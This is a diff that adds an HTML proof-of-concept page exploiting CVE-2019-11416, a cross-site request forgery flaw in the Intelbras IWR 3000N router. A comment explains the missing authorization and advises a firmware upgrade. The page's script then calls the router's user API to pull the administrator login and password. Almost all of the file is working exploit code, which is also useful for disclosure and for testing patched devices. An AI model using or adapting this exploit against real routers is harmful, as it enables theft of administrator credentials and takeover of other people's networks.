@@ -1,0 +1,35 @@
+<!--
+    PoC based on CVE-2019-11416 created by Social Engineering Neo.
+
+    Credit: https://1.337.zone/2019/04/08/intelbras-iwr-3000n-1-5-0-csrf-lead-to-router-takeover/
+
+    Due to inexistent authorization on router API on authenticated IP addresses, an attacker can use this weak spot to change router configurations and take the current administrator password.
+
+    Upgrade to latest firmware version iwr-3000n-1.8.7_0 for 3000n routers to prevent this issue.
+-->
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <meta http-equiv="X-UA-Compatible" content="ie=edge">
+            <title>IWR 3000N - CSRF on authenticated administrator</title>
+    </head>
+    <body>
+        <button onclick="exploit()">Exploit!</button>
+        <p>Click the button to get the login and password.</p>
+        <script>
+            function exploit(){
+                $.get( "http://localhost:80/v1/system/user" )
+                .done(( data ) => {
+                    alert( data );
+                })
+                .fail(function( err, status) {
+                    alert( status );
+                });
+            }
+        </script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    </body>
+</html>
